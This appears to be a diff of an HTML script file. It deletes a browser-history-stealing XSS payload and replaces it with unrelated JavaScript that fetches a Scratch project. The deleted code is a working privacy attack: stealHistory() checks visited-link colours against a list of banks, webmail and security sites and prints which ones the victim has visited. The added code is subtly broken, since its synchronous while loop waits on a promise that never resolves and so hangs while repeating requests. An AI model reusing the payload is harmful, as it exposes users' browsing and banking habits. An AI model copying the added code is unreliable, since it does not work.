@@ -1,118 +1,36 @@
-<style>
-  a:link{color:green}
-  a:visited {color:#993300}
-</style>
-<script type="text/javascript">
-var agent = navigator.userAgent.toLowerCase();
-var is_mozilla = (agent.indexOf("mozilla") != -1);
+<script>
+const getProjectMetadata = async (projectId) => {
+    // IF IN A WEB BROWSER, you need to use a service like trampoline.turbowarp.org to access the Scratch API.
+    // IF IN NODE.JS, you should use https://api.scratch.mit.edu/projects/${projectId} directly instead.
+    const response = await fetch(`https://trampoline.turbowarp.org/api/projects/${projectId}`);
+    if (response.status === 404) {
+        throw new Error('The project is unshared or does not exist');
+    }
+    if (!response.ok) {
+        throw new Error(`HTTP error ${response.status} fetching project metadata`);
+    }
+    const json = await response.json();
+    return json;
+};
 
-// popular websites. Lookup if user has visited any.
-var websites = [
-  "http://ajaxian.com/",
-  "http://digg.com/",
-  "http://english.aljazeera.net/HomePage",
-  "http://ha.ckers.org",
-  "http://ha.ckers.org/blog/",
-  "http://jeremiahgrossman.blogspot.com/",
-  "http://login.yahoo.com/",
-  "http://mail.google.com/",
-  "http://mail.yahoo.com/",
-  "http://my.yahoo.com/",
-  "http://reddit.com/",
-  "http://seoblackhat.com",
-  "http://slashdot.org/",
-  "http://techfoolery.com/",
-  "http://weblogs.asp.net/jezell/",
-  "http://www.amazon.com/",
-  "http://www.aol.com/",
-  "http://www.bankofamerica.com/",
-  "http://www.bankone.com/",
-  "http://www.blackhat.com/",
-  "http://www.blogger.com/",
-  "http://www.bloglines.com/",
-  "http://www.bofa.com/",
-  "http://www.capitalone.com/",
-  "http://www.cenzic.com",
-  "http://www.cgisecurity.com",
-  "http://www.chase.com/",
-  "http://www.citibank.com/",
-  "http://www.cnn.com/",
-  "http://www.comerica.com/",
-  "http://www.e-gold.com/",
-  "http://www.ebay.com/",
-  "http://www.etrade.com/",
-  "http://www.expedia.com/",
-  "http://www.google.com/",
-  "http://www.hsbc.com/",
-  "http://www.icq.com/",
-  "http://www.jailbabes.com",
-  "http://www.microsoft.com/",
-  "http://www.msn.com/",
-  "http://www.myspace.com/",
-  "http://www.ntobjectives.com",
-  "http://www.passport.net/",
-  "http://www.paypal.com/",
-  "http://www.sourceforge.net/",
-  "http://www.spidynamics.com",
-  "http://www.statefarm.com/",
-  "http://www.usbank.com/",
-  "http://www.wachovia.com/",
-  "http://www.wamu.com/",
-  "http://www.watchfire.com",
-  "http://www.webappsec.org",
-  "http://www.wellsfargo.com/",
-  "http://www.whitehatsec.com",
-  "http://www.xanga.com/",
-  "http://www.yahoo.com/",
-  "http://seoblackhat.com/",
-  "http://www.alexa.com/",
-  "http://www.youtube.com/",
-  "https://banking.wellsfargo.com/",
-  "https://commerce.blackhat.com/",
-  "https://online.wellsfargo.com/",
-];
+const getProjectData = async (projectId) => {
+    const metadata = await getProjectMetadata(projectId);
+    const token = metadata.project_token;
+    const response = await fetch(`https://projects.scratch.mit.edu/${projectId}?token=${token}`);
+    if (!response.ok) {
+        throw new Error(`HTTP error ${response.status} fetching project data`);
+    }
+    const data = await response.arrayBuffer();
+    return data;
+};
 
-/* prevent multiple XSS loads */
-if (! document.getElementById('xss_flag')) {
-
-  var d = document.createElement('div');
-  d.id = 'xss_flag';
-  document.body.appendChild(d);
-
-  var d = document.createElement('table');
-  d.border = 0;
-  d.cellpadding = 5;
-  d.cellspacing = 10;
-  d.width = '90%';
-  d.align = 'center';
-  d.id = 'data';
-  document.body.appendChild(d);
-
-  /* launch steal history */
-
-if (is_mozilla) {
-  stealHistory();
+var get = true;
+while (get) {
+  getProjectData('60917032').then((data) => {
+      console.log(data);
+      get=false;
+  }).catch((error) => {
+      console.error(error);
+  });
 }
-
-}
-
-function stealHistory() {
-
-  // loop through websites and check which ones have been visited
-  for (var i = 0; i < websites.length; i++) {          
-         var link = document.createElement("a");       
-         link.id = "id" + i;       
-         link.href = websites[i];       
-         link.innerHTML = websites[i];              
-         document.body.appendChild(link);       
-         var color = document.defaultView.getComputedStyle(link,null).getPropertyValue("color");       
-         document.body.removeChild(link);       
-// check for visited       
-     if (color == "rgb(0, 0, 255)") {           
-         document.write('' + websites[i] + '');
-      } // end visited check
-  
-  } // end visited website loop
-
-} // end stealHistory method
 </script>
